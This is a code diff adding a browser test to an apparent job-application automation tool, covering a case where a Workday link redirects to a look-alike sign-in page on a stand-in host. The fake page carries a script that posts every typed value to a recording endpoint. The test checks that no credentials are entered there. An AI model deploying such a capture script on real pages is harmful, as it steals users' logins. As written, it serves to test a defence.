@@ -19,7 +19,7 @@ const A = await import("../core/accounts.js");
 openDb();
 
 const HOST = "https://globex.wd5.myworkdayjobs.com";
-const site = { accounts: {}, submitted: 0, verifyLinks: [] };
+const site = { accounts: {}, submitted: 0, verifyLinks: [], otherTyped: [] };
 const W = (id) => `data-automation-id="${id}"`;
 const shell = (body, script = "") => `<!doctype html><html><body>${body}<script>${script}</script></body></html>`;
 const PAGES = {
@@ -86,8 +86,17 @@ let browser, ctx;
 test.before(async () => {
   browser = await chromium.launch({ executablePath: process.env.CHROMIUM_PATH || undefined });
   ctx = await browser.newContext();
+  // A Workday link that now leads to another site (audit 1.3): a look-alike sign-in page that records anything typed.
+  await ctx.route("https://other.example/**", async (route) => {
+    const u = new URL(route.request().url());
+    if (u.pathname === "/record") { site.otherTyped.push(route.request().postData()); return route.fulfill({ body: "ok" }); }
+    return route.fulfill({ contentType: "text/html", body: shell(`<h2>Sign In</h2><label>Email Address<input ${W("email")} type="email" id="e"></label>
+      <label>Password<input ${W("password")} type="password" id="p"></label><button ${W("signInSubmitButton")}>Sign In</button><button ${W("createAccountLink")}>Create Account</button>`,
+      `for (const el of document.querySelectorAll('input')) el.addEventListener('input', () => fetch('/record', { method: 'POST', body: el.value }));`) });
+  });
   await ctx.route(`${HOST}/**`, async (route) => {
     const u = new URL(route.request().url());
+    if (u.pathname === "/en-US/careers/job/Austin/Moved") return route.fulfill({ contentType: "text/html", body: shell("<p>Moved</p>", "location.replace('https://other.example/login')") });
     if (u.pathname.startsWith("/api/")) return route.fulfill({ contentType: "application/json", body: JSON.stringify(api(u.pathname, JSON.parse(route.request().postData() || "{}"))) });
     if (u.pathname === "/verify") { const a = site.accounts[u.searchParams.get("u")]; if (a) a.verified = true; return route.fulfill({ contentType: "text/html", body: shell("<h2>Your account is verified</h2>") }); }
     const body = PAGES[u.pathname];
@@ -145,4 +154,21 @@ test("passwords job sites would refuse are caught when the user saves them", () 
   assert.deepStrictEqual(A.passwordProblems("Tow-Truck-2026!"), []);
   assert.deepStrictEqual(A.passwordProblems("password"), ["an uppercase letter", "a number", "a symbol such as ! or #"]);
   assert.ok(A.isWorkday("https://acme.wd1.myworkdayjobs.com/x") && !A.isWorkday("https://boards.greenhouse.io/acme"));
+});
+
+test("a Workday link that leads to another site never reaches the account step, and nothing is typed there (audit 1.3)", async () => {
+  on();
+  const steps = [];
+  const r = await applyTo({ ...job("wd-moved"), apply_url: `${HOST}/en-US/careers/job/Austin/Moved` }, { progress: (k) => steps.push(k) }, { dryRun: true, browser: ctx, waitLink });
+  assert.ok(!steps.includes("account"), `steps: ${steps}`);
+  assert.notStrictEqual(r.status, "applied");
+  assert.deepStrictEqual(site.otherTyped, [], "no email or password typed on other.example");
+  // And the account step itself refuses a page that isn't Workday.
+  const page = await ctx.newPage();
+  await page.goto("https://other.example/login");
+  const w = await A.workdayAccount(page, { email: "jordan.lee@example.com", password: "Tow-Truck-2026!" }, { waitLink });
+  assert.strictEqual(w.ok, false);
+  assert.match(w.reason, /left Workday \(other\.example\)/);
+  assert.deepStrictEqual(site.otherTyped, []);
+  await page.close();
 });
